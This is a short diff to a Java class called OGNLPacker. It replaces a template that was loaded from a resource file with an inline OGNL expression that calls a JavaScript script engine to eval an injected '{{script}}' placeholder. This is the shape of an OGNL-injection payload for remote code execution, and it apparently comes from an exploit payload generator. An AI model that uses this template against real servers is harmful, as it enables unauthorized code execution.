@@ -14,15 +14,7 @@ import java.util.Objects;
  * @since 2024/12/14
  */
 public class OGNLPacker implements Packer {
-    String template = "";
-
-    public OGNLPacker() {
-        try {
-            template = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/OGNLScriptEngine.txt")), Charset.defaultCharset());
-        } catch (IOException ignored) {
-
-        }
-    }
+    String template = "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('{{script}}')";
 
     @Override
     public String pack(GenerateResult generateResult) {
